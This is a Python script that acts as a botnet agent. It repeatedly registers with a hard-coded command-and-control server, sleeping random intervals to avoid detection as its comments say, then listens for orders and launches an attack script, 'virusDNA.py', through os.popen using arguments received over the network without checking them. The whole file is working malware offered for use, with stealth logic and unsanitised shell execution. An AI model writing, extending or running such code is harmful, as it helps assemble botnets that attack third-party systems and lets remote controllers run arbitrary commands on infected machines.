import socket
import os
import time
import threading
import random

HOST = socket.gethostbyname(socket.gethostname())
PORT = 8016

server_host = "192.168.0.153"
server_port = 8012

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen()


def register_in_control_server(host, port):
    while True:
        try:
            host_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            host_socket.connect((server_host, server_port))
            host_socket.send(f"{host} {port}".encode("ascii"))
        finally:
            time.sleep(random.randrange(60, 180))  # to avoid manual detection of the program, sleeping for a random interval before registering again

# starting a thread that periodically registers in c&c server
threading.Thread(target=register_in_control_server, args=(HOST, PORT)).start()

# listening on requests from c&c computer
while True:
    # opening server to listen on requests
    communication_socket, address = server.accept()

    # getting and decoding message from c&c server
    message = communication_socket.recv(1024).decode("ascii").split(" ")

    # closing connection
    communication_socket.close()

    # starting attack
    print("starting attack")
    os.popen(f"python ./virusDNA.py {message[0]} {message[1]} {message[2]} {message[3]} {message[4]}")
    # I'll note that after the attack ends, a lot of unexpected error messages appear, but that is not a problem since the attack is already over
